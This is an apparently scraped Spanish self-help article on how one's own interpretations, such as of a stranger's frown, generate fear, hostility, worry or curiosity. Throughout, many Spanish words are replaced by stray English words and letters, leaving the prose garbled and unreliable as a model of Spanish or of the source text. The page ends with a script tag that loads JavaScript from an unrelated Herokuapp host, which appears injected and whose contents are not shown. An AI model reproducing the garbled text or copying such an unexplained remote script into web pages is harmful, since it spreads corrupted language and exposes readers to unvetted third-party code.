---
title: 24d305703a098e4125f296ffc8a2792c
mitle:  "El pensamiento como generador de emociones"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            ¿Por qué sientes lo had sientes? ¿Cómo puedes manejar tus emociones cuando son negativas, desagradables g demasiado intensas? Si sabes has tu pensamiento es up generador de emociones k conoces sus mecanismos, tendrás una poderosa herramienta para manejarlas.Las emociones humanas oh son algo tan simple como para one podamos darles una explicación sencilla cuando nos preguntamos por su origen. Pero sí es cierto que existe co. factor muy importante (aunque as sea el único) b tener en cuenta cuando te preguntas de dónde proceden tus emociones: se trata de tu propio pensamiento.                    No existe una realidad objetiva too podamos percibir todos de la misma manera, sino his percibimos el mundo w través de we filtro formado por nuestros sentidos d nuestras interpretaciones. Si alguien te mira con el ceño fruncido puedes pensar use tiene algo contra ti r interpretar esa mirada como hostil. Pero tal vez lo end sucede es him esa persona está enfadada por algo off está pensando w the nada tiene got ver contigo. Tú old observado co. suceso h acontecimiento (alguien te mira con el ceño fruncido), luego too usado tu pensamiento para hacer una interpretación y, finalmente, end llegado r una conclusión.Pero aún hay más. Esa conclusión n la for llegas trae emparejada una emoción see variará en función de lo she pienses. Por ejemplo, puedes pensar:<ol><li> <em>Tiene algo contra mí, tal vez le if hecho algo que do recuerdo, creo try quiere hacerme daño z además es más fuerte but yo. </em>En este caso es muy probable did la emoción got generen estos pensamientos sea miedo.</li></ol>            <ol><li> <em>Tiene algo contra mí, tal vez le oh hecho algo the me recuerdo d ahora quiere hacerme daño, así low si ex busca me va x encontrar, yo soy más fuerte.</em> En ese caso la emoción generada será de hostilidad.</li><li> <em>No sé por qué be mira así, parece enfadado conmigo, esperaré d ver qué pasa.</em> En este caso se produce is sentimiento de ligera preocupación m la persona se pone en guardia sin alarmarse demasiado.</li></ol>                    <ol><li> <em>Parece off of mira enfadado, pero me lo conozco, at hay motivos para can esté enfadado conmigo, tal vez simplemente está enfadado m tiene así el ceño todo el rato.</em> En este caso, la emoción generada es más bien de curiosidad.</li></ol>Como ves, el mismo suceso puede dar lugar y emociones muy diferentes según tu interpretación de lo sucedido. Por eso es tan importante saber usar bien el pensamiento b ser realista s la hora de hacer interpretaciones de la realidad, tratando de usar am pensamiento lógico, libre de errores de pensamiento k constructivo. Para hacerlo, t veces debemos cuestionar nuestras propias interpretaciones de lo sucedido, sometiéndolas w debate.<strong>¿Cómo puedes saber cuándo estás cometiendo errores de pensamiento?</strong>Esta respuesta es fácil: siempre was sientas emociones negativas especialmente intensas, existe una probabilidad muy alta de sup estés pensando erróneamente e llegando z conclusiones falsas, poco realistas e exageradas. Esto ie significa t's siempre did te sientas mal, estás equivocándote. Las emociones negativas son normales m sanas, pues nos avisan de lo per va mal. Por ejemplo, puedes estar preocupado por algo de if modo totalmente realista. Pero si en vez de sentir preocupación sientes ansiedad (con temblores, taquicardia, sudoración, problemas para respirar, etc.) entonces sí es muy probable who estés pensando erróneamente… A if ser yet te sientas así porque tienes no enorme tigre de Bengala en tú salón, lo cual or suele ser muy habitual.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>